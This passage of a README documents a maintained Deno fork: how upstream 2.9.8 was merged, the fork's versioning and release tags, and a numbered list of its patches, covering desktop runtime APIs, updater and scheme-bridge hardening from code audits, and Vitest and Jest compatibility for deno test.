# Brainwires/deno: denext's Deno

This is a fork of [denoland/deno](https://github.com/denoland/deno) that we
maintain as our own Deno (decided 2026-10-11): it follows Deno releases on our
own schedule and is not waiting to be retired in favor of stock Deno. It carries
two kinds of changes, for [denext](https://github.com/Brainwires/denext) and its
users:

- **The Deno Desktop runtime**: the `libdenort` library `deno desktop` embeds an
  app into, plus [laufey](https://github.com/littledivy/laufey)'s backend hosts
  (items 1-22 below, plus the `deno_core` fix in item 25). It is published as
  prebuilt archives that also work with the stock `deno desktop` CLI (2.9.8):

  ```sh
  DENORT_DESKTOP_BIN=<unpacked archive>/libdenort.dylib   # .so on Linux, denort.dll on Windows
  LAUFEY_DEV_DIR=<unpacked archive>/laufey
  deno desktop --backend webview|cef ...
  ```

- **Features of the `deno` CLI and runtime itself**, such as Vitest / Jest
  compatibility for `deno test` (item 23), the built-in SQL client (`Deno.SQL` /
  `Deno.sql`, item 24), native type checking on TypeScript 7 (item 47) and
  Node.js compatibility beyond stock Deno's (items 48-67: CommonJS detection,
  npm's hoisted node_modules, npm's lifecycle-script behavior, `node` / `npx` /
  `npm` executables, `better-sqlite3`). These need this fork's own `deno`
  binary, published with each runtime release since `denext.15` (`deno-cli-*`,
  see [Release archives](#release-archives) and item 26) or built from a release
  line (see [Reproducing a build](#reproducing-a-build)); the stock CLI does not
  have them.

## Upstream

Changes that would help everyone can still be offered to denoland/deno, but
nothing here depends on that: the fork keeps every change whether or not
upstream takes it, and is rebased onto a newer Deno when we choose to move.

### Upstream syncs

Every upstream Deno release is merged into `development-denext` as it ships, by
hand (there is no sync automation), on a `sync/upstream-<version>` branch with a
merge commit, so the history shows each sync. Upstream will not ship a 3.0
(denoland/deno#37030: `main` goes back to 2.9, and 2.9.x is an LTS line until
2027-10), so these syncs take upstream's 2.9.x bug and security fixes into the
fork's own line (`3.0.0-denext.N`); `cli/lib/upstream_version.txt` names the
merged upstream release.

- **2.9.8** (merged 2026-10-22, `sync/upstream-2.9.8-b`, on top of 3.0.0-rc.3
  and the Rust 1.99.1 pin of item 100). Already carried before the merge and now
  upstream's own commits: #36925, #36962, #36942, #36901, #36968 and the rand
  0.9.3 bump (item 27), and #37026 (item 33, identical to ours). New from
  upstream: X.509v1 handling aligned with OpenSSL (#36933), npm package link
  names validated (#37047), zsh completion of script paths for a bare `deno run`
  (#36976), `assert` message functions and format arguments (#36944),
  `mock.reset()` restoring `mock.method()` (#36886) and the distrusted eMudhra
  CAs (#37046). Conflicts and how they were resolved:
  - `cli/lib/version.txt`, `cli/Cargo.toml`, `cli/rt/Cargo.toml`: our
    `3.0.0-rc.3` kept; `upstream_version.txt` set to `2.9.8`.
  - `Cargo.toml`: upstream's crate version bumps taken, our `deno_sql` kept;
    `aws-lc-sys` stays at our `0.46.0` (upstream 0.40.0). Our rustls 0.23.46,
    rustls-webpki 0.103.16, webpki-roots 1.0.10, hyper 1.11.1, hyper-util 0.1.21
    and rand 0.9.3 already matched or exceeded upstream's.
  - `Cargo.lock`: ours, with the workspace versions refreshed and `deno_graph`
    0.111.1 (upstream's bump) taken; upstream's extra `webpki-roots` 0.26.11
    shim is not needed (nothing here depends on 0.26).
  - `ext/node/ops/tls_wrap.rs`: upstream's #36933 replaces the carried #36248
    (item 68); our three other commits there (empty TLS writes #36986, the
    onread backing store #37013, `setMaxSendFragment`) re-applied on top
    cleanly. `deno_node`'s `x509-parser` dependency (only #36248 used it)
    dropped. #36248's `tls_test.ts` cases now expect upstream's error codes (see
    item 68).
  - `libs/npm_installer/{local,hoisted}.rs`: upstream's new
    `symlink_package_dir(sys, target, node_modules, name)` signature at the two
    workspace-link call sites; the carried #36103 checks stay (see item 75), and
    its two unit tests moved to the new signature (a `.hidden` case added so the
    hidden-component check is still reached).
  - `tests/node_compat/config.jsonc`: our enabled async-hooks tests kept next to
    upstream's re-enabled `test-assert.js`.
  - `tests/specs/node/node_test_mock_timers/test.js`: identical assertion; our
    comment kept.
  - `.github/workflows/ci.generated.yml`: stays deleted (the fork's
    `denext_tests*.yml` replace it).
  - `STOCK_DENO_VERSION` in `denext_runtime.yml` (the stock `deno desktop` the
    smoke and e2e jobs package with) follows the upstream version, now 2.9.8.

## Versioning

The fork has its own version, a plain semver in `cli/Cargo.toml`,
`cli/rt/Cargo.toml` and `cli/lib/version.txt`. Three schemes so far:

- `2.9.7-denext.1` to `2.9.7-denext.22`: each release named after the upstream
  release it was built from;
- `3.0.0-rc.1` to `3.0.0-rc.6`: the fork's own version, as release candidates of
  a 3.0 that was to follow upstream's;
- from **3.0.0-denext.1** (the release that was going to be `3.0.0-rc.7`):
  `3.0.0-denext.1`, `3.0.0-denext.2`, ... There are no more release candidates.
  Upstream Deno will not ship a 3.0 (denoland/deno#37030: `main` goes back to
  2.9, and 2.9.x is an LTS line until 2027-10), so this is the fork's stable,
  forward line; the core stays `3.0.0` and `N` counts releases.

Release order is `2.9.7-denext.22` < `3.0.0-rc.1` < ... < `3.0.0-rc.6` <
`3.0.0-denext.1` < `3.0.0-denext.2` < .... Plain semver gets every step right
but one: it puts `3.0.0-denext.N` below `3.0.0-rc.1`, because prerelease
identifiers compare as ASCII (`d` < `r`). Whatever orders the fork's releases
must therefore rank the `denext` line above the `rc` line on the `3.0.0` core:
denext's `compareDenoVersions` does, and so does the release gate's "Latest"
choice (`.github/denext-runtime/tag_gate.py`, `version_key`). The fork itself
compares none of its own versions: `deno upgrade` refuses in a release build
(below), the desktop updater's downgrade guard compares the app's version, and
`DENEXT_VERSION` is matched as a string.

- **The upstream version** the fork is built from is in
  `cli/lib/upstream_version.txt` (`2.9.8`; `UPSTREAM_DENO_VERSION` in
  `cli/lib/version.rs`). Everything that means upstream Deno uses it, never the
  fork's own version, which names no upstream release: the release channel
  (`deno --version` says `stable`, upstream's channel for 2.9.8, not
  `release candidate`), the `denort` / `libdenort` downloads from dl.deno.land,
  the `engines.deno` check of `deno install` (npm ranges never match a
  prerelease, so `>=1.0.0` would reject `3.0.0-denext.1`), and `deno.version` in
  each archive's `BUILD_INFO.json` and in the release's `manifest.json`
  (denext's pins read it as `deno`: the stock Deno whose `deno desktop` packages
  with the runtime).
- **A release** is tagged `denext-runtime-v<version>`
  (`denext-runtime-v3.0.0-denext.1`); the release workflow refuses a tag that is
  not exactly the version in `cli/Cargo.toml` (and `cli/lib/version.txt`), so
  bump those first. Every archive is named after the version
  (`deno-cli-3.0.0-denext.1-<target>.zip`, ...). A `3.0.0-denext.N` release is a
  full GitHub release (the repository's "Latest" when it is the newest); only a
  `3.0.0-rc.N` was published as a pre-release. An untagged workflow run builds
  `<version>+ci.<run>`: build metadata, the same precedence as the version it
  builds toward.
- **A release build** bakes `DENEXT_VERSION=<version>` in (item 26). It marks
  the binary as denext's: `deno --version` ends with
  `denext <version> (Brainwires)` and `Deno.build.denext` is the version (item
  99), `deno compile` takes the release's own `denort`, and `deno upgrade` (and
  its background update check) is off, because upstream's channels would replace
  this fork with stock Deno. Update it through denext (`denext upgrade`,
  `denext toolchain install`) or from this repository's releases. A build
  without it (tests, a local `cargo build`) keeps upstream's `deno upgrade`.

## Branches and tags

| Ref                                                                                                                   | What it is                                                                                                                                                                                                                                                                               |
| --------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `development-denext`                                                                                                  | The working line: every feature and fix branch is merged here (`--no-ff`), and runtime releases are cut from it as `denext-runtime-v<version>` tags (see [Versioning](#versioning)). Replaces the per-release `rel/denext<n>` lines, which stay for history (`denext.6` to `denext.22`). |
| `denext/v<deno version>` (e.g. `denext/v2.9.7`)                                                                       | The original line: upstream tag `v<deno version>` + the first feature commits + this file and the release workflow. The default branch of this fork.                                                                                                                                     |
| `feat/desktop-*`, `fix/*`, `ci/*`, `test/*`                                                                           | The feature and fix branches merged into `development-denext`. Kept for review and for rebasing onto a newer Deno.                                                                                                                                                                       |
| `denext-runtime-v<version>` (e.g. `denext-runtime-v3.0.0-denext.1`; before it `-v3.0.0-rc.<n>`, `-v2.9.7-denext.<n>`) | A published runtime. PUSHING such a tag runs the workflow and creates the GitHub Release (a manual dispatch on a tag ref builds but never publishes). `<version>` is the fork's own ([Versioning](#versioning)).                                                                         |

`main` and the other upstream branches are untouched mirrors from the fork
point. Nothing here is proposed back from this fork; the upstream PRs below are
where the changes are discussed.

## What is patched (on top of `v2.9.8`)

1. **`feat(net,http)`: in-process memory transport for `Deno.serve`** —
   `DENO_SERVE_ADDRESS=memory:<name>`. Ported from
   [denoland/deno#35675](https://github.com/denoland/deno/pull/35675).
2. **`feat(desktop)`: serve the app at a stable, configured origin** —
   `desktop.app.origin` (`<scheme>://<host>`), a custom-scheme handler that
   bridges webview requests into `Deno.serve` over the memory transport, a
   WebSocket relay that checks the `Origin` header.
3. **`feat(desktop)`: read the app origin from an embedded
   `.deno-desktop/app.json`** — so a stock CLI that rejects `desktop.app.origin`
   in `deno.json` can still configure it:
   `{ "origin": "<scheme>://<host>", "identifier": "<reverse-DNS id>" }`,
   embedded with `"compile": { "include": [".deno-desktop/app.json"] }`.
4. **`fix(desktop)`: set the Linux app_id so Wayland shows the configured icon**
   — a port of
   [denoland/deno#35662](https://github.com/denoland/deno/pull/35662) by Leo
   Kettmeir ([@crowlKats](https://github.com/crowlKats)), authored by him;
   squashed and re-applied onto `v2.9.7`.
5. **`feat(desktop)`: hand every laufey backend the app identifier** —
   `LAUFEY_APP_ID`, so each app's web storage (localStorage, IndexedDB, cookies)
   lives in its own directory and persists across launches.
6. **`feat(desktop)`: deep links, opened files and second instances in
   `Deno.desktop`** — `openurl` / `openfile` / `secondinstance` events plus
   `Deno.desktop.launchUrls` / `launchFiles`, `desktop.app.singleInstance`, and
   a `laufey-launch.json` in every package. Built on laufey's `on_open_url`
   ([littledivy/laufey#77](https://github.com/littledivy/laufey/pull/77) by
   [@diegoholiveira](https://github.com/diegoholiveira)) and
   `on_second_instance`.
7. **`fix(http)`: an absolute-form request target can't claim `http+memory:`
   over TCP** (400), and **`feat(os)`: an env overlay** so the runtime never
   calls `setenv` while the host's UI thread runs.
8. **`feat(desktop)`: register deep-link schemes with the OS and report their
   owner** — `Deno.desktop.getSchemeOwner` / `registerScheme({ force })`, a
   first-launch registration that never takes a scheme another app owns (Windows
   HKCU, macOS LaunchServices, Linux XDG), and the Windows `.msi` writing the
   same keys at install.
9. **`feat(desktop)`: native passkeys** — `Deno.desktop.passkeys`
   (`capabilities` / `create` / `get`) on macOS AuthenticationServices and
   Windows `webauthn.dll`, with the request/response envelope of
   `@clerk/electron-passkeys`.
10. **`feat(desktop)`: window state, size limits, screens, chrome, cancelable
    close and quit** — `BrowserWindow` maximize / minimize / fullscreen with
    events, min / max size, `getBounds` / `setBounds` / `getNormalBounds`, title
    bar styles, traffic-light position, Mica / Acrylic and vibrancy;
    `Deno.desktop.screens()`, `"displaychanged"`, `windowCapabilities()`,
    `quit()` (cancelable, Electron's `app.quit()`) and `quitOnLastWindowClosed`;
    a cancelable `close` event (5 s answer timeout); the tray-only and
    off-screen placement fixes. On top of
    [denoland/deno#36761](https://github.com/denoland/deno/pull/36761)
    (`devicePixelRatio`, inner / outer size, `screenX` / `screenY`, by Kenta
    Moriuchi, [@petamoriken](https://github.com/petamoriken)) and
    [denoland/deno#36789](https://github.com/denoland/deno/pull/36789)
    (`desktop.initialWindow`, by Sasivarnan R,
    [@sasivarnan](https://github.com/sasivarnan)), cherry-picked with their
    authorship; `initialWindow` is also read from the embedded
    `.deno-desktop/app.json`.
11. **`fix(desktop)`: Node-API addons load on Windows** — addons look the
    Node-API functions up in the host executable (node-gyp's delay-load hook,
    napi-rs / neon `GetProcAddress(GetModuleHandle(NULL))`), which in a desktop
    app is laufey's host and exports nothing, so the first Node-API call killed
    the process (`0xC06D007F`). The runtime now gives the executable an
    in-memory export table whose Node-API entries jump to the DLL's functions
    (`cli/rt_desktop/napi_host_exports.rs`). macOS and Linux already resolved
    them (the dylib's exports promoted to `RTLD_GLOBAL`, with
    denoland/deno#36718's Linux flag fix). The runtime smoke test loads a probe
    addon (`.github/denext-runtime/napi-probe`) on every target.

12. **`feat(desktop)`: drag and drop, native file dialogs and the rich
    clipboard** — `BrowserWindow` `dragenter` / `dragover` / `dragleave` /
    `drop` with native paths and `startDrag({ files, icon })`;
    `Deno.desktop.dialog.showOpenDialog` / `showSaveDialog` (the OS's own
    dialogs, AbortSignal-cancellable, never blocking the runtime);
    `Deno.desktop.clipboard` (text, HTML, PNG images, `availableFormats()`, a
    `"change"` event); new `windowCapabilities()` keys (laufey API 39).

13. **`feat(desktop)`: global shortcuts, launch at login and DevTools control**
    — `Deno.desktop.shortcuts` (`register(accelerator,
    callback?)` resolving
    with the canonical accelerator, `unregister`, `unregisterAll`,
    `isRegistered`, `list`, `canonicalize`, a `"shortcut"` event; errors carry a
    `code`: `invalid`, `conflict`, `already_registered`, `not_supported`,
    `denied`); `Deno.desktop.launchAtLogin` (`get()` / `set(enabled)`: `enabled`
    / `disabled` / `requires-approval` / `not-supported`);
    `Deno.desktop.devtools` (`enabled`, `open` / `close` / `toggle` / `isOpen`)
    and `BrowserWindow.closeDevtools()` / `toggleDevtools()` /
    `isDevtoolsOpen()` / `isDevtoolsEnabled()`; `openDevtools()` does nothing
    when the app launched with DevTools off (`LAUFEY_INSPECTABLE=0` /
    `"inspectable": false`), in dev mode too (laufey API 40).

14. **`feat(desktop)`: menu accelerators and close events, scheduled and
    actionable notifications** — menu `accelerator`s work on every backend
    (`Deno.desktop.menuCapabilities()` says what each supports);
    `showContextMenu` returns a promise of the chosen id (`null` when dismissed)
    and fires `contextmenuclose`. `Notification` takes `actions` and `data`,
    fires a separate `action` event (actions are no longer folded into `click`)
    and reports `Notification.maxActions`; `Deno.desktop.notifications` adds
    `schedule({ at, ... })`, `getScheduled()`, `cancel(tag)`, `capabilities()`
    and `requestPermission({ provisional })`. A click on a notification of an
    earlier run, or the one that launched the app, is a `notificationresponse`
    event, and `Deno.desktop.launchNotificationResponses` holds the ones that
    arrived before the app listened (laufey API 41).

15. **`feat(desktop)`: OS auth sessions and native code on the UI thread** —
    `Deno.desktop.authSession` (`capabilities()`,
    `start({ url,
    callbackScheme | callbackUrl, ephemeral, window })`
    resolving with the callback URL) runs `ASWebAuthenticationSession` on macOS,
    with a real `cancelled` when the user closes the sheet; Windows and Linux
    have no OS equivalent and reject with code `not_supported` (RFC 8252: the
    system browser). `Deno.desktop.runOnMainThread(fn, context)` calls a native
    `void* (*)(void*)` (an `UnsafeFnPointer`, `UnsafeCallback` or pointer) on
    the UI thread and resolves with its return value as a bigint; it needs
    `--allow-ffi` and rejects instead of hanging once the app is quitting. Both
    are main-scope only (laufey API 42, which also stops WebKitGTK's
    custom-scheme writes from blocking the event loop).
    `Deno.desktop.authSession.cancel()` (laufey API 43) ends the running session
    when the app gives up on it: the sheet closes and `start()` rejects with
    `cancelled`, exactly once; it returns `false` when no session is running
    (always on Windows and Linux).

16. **`fix(desktop)`: `Notification.close()` no longer deadlocks** — it held the
    runtime's notification map lock while the backend waited for the thread
    whose close event takes that lock (found by the e2e suite).
17. **`fix(desktop)`: the update helper waits for the install's processes on
    Windows** — a CEF subprocess outliving its browser process kept the install
    directory from being renamed, failing the rollback of an unconfirmed trial
    (found by the e2e suite).
18. **`feat(desktop)`: full-app self-update (`Deno.desktop.updater`)**
    (`1511cdaa20`) — a signed manifest (ECDSA P-256 over
    `"denext-app-update-v1\n" + signed`), a size-capped and SHA-256-checked
    download, a safe extractor, the OS code-signature check against the running
    app (same Developer ID Team ID + Gatekeeper on macOS, same Authenticode
    signer on Windows), an atomic swap by a helper process, and a rollback of a
    version not confirmed by its next launch. With its fixes: a rolled-back
    install is finished deleting at the next start (`5e009fb794`), the macOS
    helper finds the bundle's runtime (`3c6217526f`), and the ops act only
    inside a packaged app (`5132a43948`).
19. **`fix(desktop)`: the JIT entitlement for webview bundles** (`346cb47225`)
    and **`Dock.setBadge(null)` clears the badge** (`16f8a904a4`, it showed
    "null").
20. **`fix(desktop)`: the 3.1.0 fork-code audit** (`fix/fork-audit`):
    - `node:http` / `node:https` / `node:http2` serve under the memory transport
      (they failed with "unknown override kind: 5", so a framework on
      `node:http` never served); the socket's `remoteAddress` is
      `memory:<name>`;
    - a string with an embedded NUL is a `TypeError` at every op that hands it
      to laufey (the laufey crate panicked, and a panic exits the app);
    - `op_desktop_alert_async` survives bootstrap, so the uncaught-error dialog
      shows again;
    - the close request's 5 s answer timeout does not count time the JavaScript
      thread spends in a synchronous `alert` / `confirm` / `prompt` (a close
      listener's `confirm()` no longer closes the window under the user);
    - a window with a WebGPU surface is hidden, never destroyed, on every close
      path (the user's, a timed-out request, DevTools), not only `close()`;
    - the first `BrowserWindow` adopts the bootstrap window only when its
      creation-time options (`frameless`, `noActivate`, `transparent`,
      `transparentTitlebar`) agree; a tray panel is a real panel again;
    - the event queue coalesces pointer motion, wheel, resize and move, drops
      only motion and wheel when full, and never loses a discrete event (a lost
      `contextMenuClose` used to wedge `showContextMenu()`); a binding's handler
      no longer keeps the queue alive;
    - `BrowserWindow` / `Dock` / `Tray` / `Notification` throw `NotSupported` in
      workers (they panicked) and are kept out of worker scope;
    - `DENO_SERVE_ADDRESS=memory:` is not inherited by child processes (env
      overlay variables can be process-local:
      `deno_os::set_env_overlay_var_not_inherited`);
    - an HTTPS error report gives up after 5 s instead of hanging the exit;
    - the scheme bridge drops a request the webview cancelled (laufey's
      `on_cancel`, `SchemeExchange::is_cancelled`), so the app's
      `request.signal` aborts and a long poll or an endless stream ends; it
      honours short writes (it dropped the rest of the chunk) and waits instead
      of buffering a slow reader's stream, drops a forwarded `content-length` /
      `expect`, keeps non-ASCII header values, and rewrites `http+memory://`
      URLs in `Location` / `Content-Location` / `Refresh` onto the app origin;
    - the updater: a `check()` during a download no longer relabels it, the
      state file reads across versions (no `deny_unknown_fields`), a reused
      trial PID is not taken for the trial (process start time), an executable
      without its execute bit is refused at `stage()`, and large deletions and
      the download's fsync run off the JavaScript thread;
    - the config schema describes `desktop.initialWindow`, `errorReporting`,
      `macos` and icon sets;
    - the fork's `deno desktop` refuses to download the laufey release hosts (an
      older C ABI the runtime can't load) and says to set `LAUFEY_DEV_DIR`;
    - CI: only a tag push publishes, the lockfile check compares every package
      but laufey and the build is `--locked`, and the archive check fails on an
      unresolved macOS dependency and checks Windows imports (`pe_deps.py`).

21. **`fix(desktop)`: the 3.1.1 audit** (`fix/audit-3-1-1`, runtime `denext.9`,
    laufey API 44):
    - a forked worker runs only for the app's own runtime: both fork shapes
      (`<App> run x.js`, and a compiled binary's `<App> x.js` with
      `DENO_INTERNAL_CHILD_ENTRYPOINT`) need a per-launch
      `DENO_DESKTOP_WORKER_TOKEN` naming the real parent (which runs the same
      executable) and an inherited IPC channel; a packaged app forks only
      modules under its embedded file system, and a worker exits when its module
      is done; any other such launch exits at once;
    - `node:child_process` no longer copies the process-local
      `DENO_SERVE_ADDRESS=memory:` into a child's environment;
    - the scheme bridge: a non-ASCII `Location` no longer panics; a request from
      a document of another origin (as far as the engine discloses `Origin` /
      `Sec-Fetch-Site`) carries the `x-deno-desktop-cross-origin` header; a body
      the backend failed to deliver is a 400; laufey's write backpressure (API
      44: 0 means retry the same bytes) stops on a cancel;
    - the WebSocket relay requires a per-launch token in the request target
      besides the exact `Origin`: `DENO_DESKTOP_WS_URL` is the relay origin plus
      `/.deno-desktop-relay/<64 hex>`, and child processes don't inherit it;
    - bindings answer only the app's own documents (the app origin, a
      development run's dev server) unless `bind(name, fn, { origins })` opts
      another origin in; `{ withCaller: true }` passes the caller's
      `{ origin, windowId }`;
    - the updater: every PE file pinned to the running app's signer (issuer +
      subject), the staged app's own version checked against the manifest,
      required manifest `expiresAt` / `sequence` (a lower sequence than the
      highest accepted is `replayed`), a set of rejected versions, crash-safe
      swap and rollback (atomic exchange, a checked undo), an OS file lock for
      the helper, symlink-safe owned state / log / lock files, extracted modes
      masked to `0o755` and symlinks kept inside the app;
    - reading / watching the clipboard, global shortcuts, `launchAtLogin.set`,
      `registerScheme({ force: true })` and OS notifications need unscoped
      `--allow-sys`;
    - launch arguments: after the scheme registration's `--` only one
      declared-scheme link counts, and a network path is never checked; macOS
      `openURLs` drops undeclared schemes; `runOnMainThread` refuses a
      `Deno.UnsafeCallback`; page values become own data properties; `close()`
      of a WebGPU window closes it; a NUL title is refused before the window
      exists; the error report leaves the JavaScript thread; a closed window's
      JavaScript state and old notifications are forgotten.
22. **`feat(desktop)`: Linux platform features** (`feat/linux-l0`, laufey API
    45): `Deno.desktop.platformFeatures()` (a promise: the probe runs off the
    JavaScript thread) reports what the session provides, probed by laufey
    instead of guessed from the desktop's name (the tray host, the Secret
    Service's state, the notification server, the session type, the
    xdg-desktop-portal versions, the cookie store); `desktopHint`
    (XDG_CURRENT_DESKTOP) only with env access. `Deno.desktop` fires
    `"platformfeatureschanged"` when a tray host appears or goes away. On Linux,
    `new Deno.Tray()` throws `NotSupported` with the reason (the tray part of
    the probe only) when no icon can be shown (no StatusNotifierWatcher and no
    XEmbed tray, as on stock GNOME, or no appindicator library) instead of
    returning a dead tray; `alert()` / `confirm()` / `prompt()` throw
    `NotSupported` when the backend has no way to show a dialog, instead of
    reading as a cancel. When no one can hand out the cookie key (a Secret
    Service that could only answer through a prompt no one can answer, or, on
    KDE, a KWallet that isn't open), CEF starts with `--password-store=basic`
    (it used to hold every request that carries cookies forever) and reports
    `cookieEncryption: "basic"`, unless the profile's cookie database holds
    cookies encrypted with the OS key (`v11` rows, or a database it can't read):
    Chromium deletes cookies it can't decrypt, so such a profile keeps the OS
    key and waits for it, with a stderr warning and the reason in
    `cookieEncryptionWait`. An explicit `--password-store=basic` on such a
    profile is honoured with a warning that those cookies will be deleted.
23. **`feat(test)`: Vitest compatibility for `deno test`**
    (`feat/vitest-compat`, CLI only): Vitest suites run unchanged. `vitest`,
    `vitest/config`, `vite-plus/test`, `@jest/globals` (bare or `npm:`) resolve
    to built-in `deno-vitest:` modules — Vitest's own runtime (runner, `expect`,
    `vi`, snapshots, test environments, chai), vendored by
    `tools/vendor_vitest.ts` — through a new `SpecifierOverrides` hook in
    `deno_resolver`. Each Vitest file runs under Vitest's runner from a per-file
    preload, and every test is registered with `Deno.test()` so Deno's
    reporters, `--filter` and summaries see one test per Vitest test. A
    `vitest.config.*` (or a `vite.config.*` of a project that depends on Vitest)
    is evaluated once: `include`/`exclude`, `projects` (`--vitest-project`; a
    file several projects include runs once in each, as with Vitest and Jest,
    its tests named `|project| ...` when several projects run), `setupFiles`,
    `globals`, `environment` (the project's own jsdom / happy-dom, also per file
    via `@vitest-environment`), aliases and tsconfig paths (in the dependencies
    `server.deps.inline` selects too, which Vitest inlines), `define`/`.env`
    into `import.meta.env` (a `deno_core` prototype for user modules'
    `import.meta`), mock reset flags and timeouts; Vite's
    CSS/asset/`?raw`/`?url` imports and its extension and directory resolution
    apply in such projects, and `esbuild.loader: "jsx"` (or `oxc.lang`) with its
    `include` makes `.js` files JSX: `deno_resolver`'s file fetcher gained a
    `LocalContentTypeOverride` hook, through which such user modules get the JSX
    content type (hence media type). In a Vitest or Jest project the user
    modules do not see the `Deno` global, as under Node.js: one that refers to
    `Deno` without declaring it gets a top-level `var Deno;` from the transform
    (`typeof Deno` is `"undefined"`). The global itself stays, as Deno's Node.js
    APIs and the test runtime need it; `globalThis.Deno` (and dependencies)
    still reach it. `--no-vitest-compat` / `test.vitestCompat: false` turn it
    off; `--vitest-config` picks a config.

    **Permissions**: a Vitest file needs only the permissions its own code does.
    The environment variables Vitest's runtime reads to choose its output
    (`FORCE_TTY`, `TERM`, `CI`, `NODE_ENV`, `GITHUB_ACTIONS`, ...; a fixed list)
    come from `Deno[Deno.internal].vitestEnv()` (in `cli/js/40_test.js`, through
    `op_get_env_no_permission_check`, like Deno's own internal reads; the
    vendored reads are patched by `tools/vendor_vitest.ts`), while the test's
    own reads stay checked. A snapshot file the test may not read counts as
    missing, and saving it then fails with the read error; `loadEnv` takes only
    the `.env` files without `--allow-env`. An error of Vitest's runner after
    collection (such as a snapshot save) fails the tests that did not run, or
    the file, instead of being dropped.

    **The runner's own reads** need no `--allow-read` either, the way Deno reads
    `deno.json`, the module graph and `node_modules` without it: the config it
    found (`vitest.config.*` / `vite.config.*` / `jest.config.*`, the
    package.json `jest` key) and the project configs and Jest presets it names,
    the files it reduces to options (tsconfig `paths` / `jsx`, `.env` files,
    Babel and swc configs), `__mocks__` lookups (Jest's root `__mocks__`
    included), and the modules it imports itself: the config, setup files and
    Jest snapshot serializers, `__mocks__` files, automocked modules, and the
    fixed paths a Jest `moduleNameMapper` maps to. Such a module loads like a
    static import (its static imports are part of the module graph); what its
    code then does (a read, a dynamic import, a CommonJS `require()` of another
    file) is checked as usual, so a config's own reads stay checked. These reads
    are confined to the run's root (the working directory and the config's
    directory): a path is privileged only when, canonicalized, it lies inside
    it, so a symlink out of it or a `..` is not, and goes through the
    permissions like the test's reads. It is a privileged path, not a permission
    (`cli/tools/test/vitest/runner_reads.rs`): the config worker and a Vitest
    file's worker get the `deno_vitest_runner` ops, which read with privilege
    only with the worker's token, handed once by
    `Deno[Deno.internal].takeVitestRunnerFs()` to the runner's entry module
    (`config_loader.js`, `preload.js`) before user code runs, and only the
    config worker reads file contents. A module the runner imports is recorded
    with the worker's module loader, whose `prepare_load` (and
    `ensure_read_permission` for `require()`) then treats it as a static import.
    The test's own reads, dynamic imports and `vi.importActual()` of a module
    outside the graph stay checked; snapshot files still need `--allow-read`,
    like `assertSnapshot`.

    **Module mocking** (`vi.mock` / `vi.unmock` / `vi.doMock` / `vi.doUnmock` /
    `vi.hoisted` / `vi.importActual` / `vi.importMock` / `vi.resetModules`,
    `vi.spyOn(namespace, "export")`, and `jest.mock` & co. from `@jest/globals`)
    works the way Vitest's does, in three parts:

    - _Transform_ (`cli/tools/test/vitest/transform.rs`): `deno_resolver`'s
      `Emitter` gained an `EmitProgramTransform` hook, run on the swc program
      after the TypeScript/JSX passes and before emitting (its key is part of
      the emit cache hash; JavaScript user modules are emitted too when it
      applies). In a Vitest run it applies to user modules (`file:` outside
      `node_modules`). A module calling the mocking API gets Vitest's
      `hoistMocks`: `vi.mock` / `vi.unmock` / `vi.hoisted` move above the
      imports, every import except the `vitest` one becomes
      `const __vi_import_N__ = await import(...)` after them, and references to
      imported bindings (matched by syntax context, so shadowing is respected)
      become `__vi_import_N__.name`, so a factory using an import hits the TDZ
      like in Vitest; nested or exported mocking calls are Vitest's errors.
      Every user module also gets _mutable exports_: its exported `const`s
      become `let`, and it registers a setter for its exports (re-exports
      forward to their source) keyed by its own namespace, which it imports
      through `deno-vitest:///self` (the loader resolves that to the importing
      module).
    - _Registry_ (`cli/tools/test/vitest/mocks.rs`): every worker's
      `CliModuleLoader` owns a `VitestMocks`, also put into the worker's
      `OpState` (through a new `CreateModuleLoaderResult::op_state_init`). A
      mock is registered by the URL its path resolves to from the caller, so
      `./db`, `@/db` and `../db.ts` are one mock. Once mocking is enabled, the
      loader resolves an import of a mocked URL from user code (never from
      `node_modules`, which Vitest leaves external) to
      `deno-vitest:///mock?id=<n>&name=<imported names>`; the names come from
      parsing the importer's original source, so an importer can import names
      the factory does not return (they are `undefined`, Vitest throws on
      access). Loading that module asks the worker's JavaScript (an unref'd
      polling op, like the `registerHooks` load bridge) for its source, and the
      event loop runs during module loads meanwhile.
      `deno-vitest:///actual?url=` imports the real module. `vi.resetModules()`
      bumps a generation: user modules resolved afterwards get a
      `__vitest_gen=<n>` query and are served from the module without it, so
      they are fresh instances (mocks are kept). Each test file runs in its own
      worker, hence its own registry.
    - _Runtime_ (`js/mocker.js`): `vi.mock()` & co. register mocks through the
      ops; the source of a mock module exports each key of the factory's result
      (run once, lazily, with `importOriginal`), of the automocked module
      (`mockObject` from `@vitest/mocker`, vendored), or of the `__mocks__` file
      (Vitest's `findMockRedirect`), as `let` bindings with a setter.
      `vi.spyOn()` on a module namespace spies on a proxy whose property
      definitions go through the module's setter, so the spy (and its restore)
      reaches every importer.

    **Coverage**: `deno test --coverage` and `deno coverage` report the modules
    the transform changed (`tests/specs/test/vitest/coverage`). `deno coverage`
    cannot reproduce the transform, whose key (part of the emit cache key)
    depends on the run's config, so when the emit cached under the module's own
    key is missing or is not what ran, it takes the module's cached emit
    whatever its key (new `Emitter::maybe_cached_emit_any_source_hash` /
    `EmitCache::get_emit_code_any_source_hash`; since item 31 the transformed
    emit, cached apart from the plain one), accepted only when its inline source
    map's sources content is the module's current source (or it maps nothing, as
    for a module of types) and its length without the source map is the length
    of the script V8 ran (its top-level function's range). A JavaScript user
    module, which the transform emits too, is matched the same way. Coverage
    ranges starting after the module's last mapping (the export setters the
    transform appends) are dropped like transformer helpers, `deno-vitest:`
    modules (the vendored runtime, the mock modules) are left out of reports,
    and a mocked module's coverage merges the files where it is real,
    `importOriginal` / `vi.importActual` included.

    **Jest projects** run on the same layer. Without a Vitest config, a
    `jest.config.{ts,mts,cts,js,mjs,cjs,json}`, a package.json `"jest"` key or a
    package.json depending on Jest (Jest's defaults) is the test config
    (`--vitest-config` takes a `jest*` file or a package.json too).
    `js/jest_config.js` evaluates it in the config worker (`preset`s merged,
    `projects` as objects or directories, `displayName` naming them for
    `--vitest-project`) and maps it onto the Vitest projects: `roots`,
    `testMatch` (micromatch's bare `(a|b)` groups included, matched against
    absolute paths) or `testRegex`, `testPathIgnorePatterns` and
    `moduleFileExtensions` select the files (`Project::matches_jest`);
    `moduleNameMapper` entries become aliases that map the whole specifier
    (`<rootDir>`, `$1`), applied to every module like Jest does: the imports of
    dependencies too (a project module they map to is added to the module graph
    when loaded) and, once the environment is set up, the `require()` calls of
